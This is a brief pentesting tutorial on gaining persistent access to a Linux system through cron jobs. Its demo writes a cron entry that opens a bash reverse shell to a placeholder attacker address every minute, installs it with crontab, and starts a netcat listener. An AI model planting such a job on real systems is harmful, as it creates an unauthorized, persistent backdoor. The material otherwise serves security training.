# Persistence Via Cron Jobs

Linux implements task scheduling through a utility called Cron. Cron is a time-based service that runs applications, scripts and other commands repeatedly on a specified schedule.

An application, or script that has been configured to be run repeatedly with Cron is known as Cron Job.

We can use cron jobs to execute a command or script at a fixed interval to ensure we have persistent access to the target system.

## Anatomy of a Cron Job

\*\*\*\*\* means that the cron job will run every minute of every hour of every day of every month and every day of the week.

## Practice Demo

#### Enumerate the cron file

* <mark style="color:yellow;">cat /etc/cron\*</mark>

#### Setting up the cron job

* <mark style="color:yellow;">echo "\* \* \* \* \* /bin/bash  -c 'bash -i >& /dev/tcp/ourIP/localport 0>&1'" > cron</mark>

#### Now add the cron file to the crontab

* <mark style="color:yellow;">crontab -i cron</mark>

#### List current cron jobs

* <mark style="color:yellow;">crontab -l</mark>

#### Set up our listener

* <mark style="color:yellow;">nc -nvlp 1234</mark>
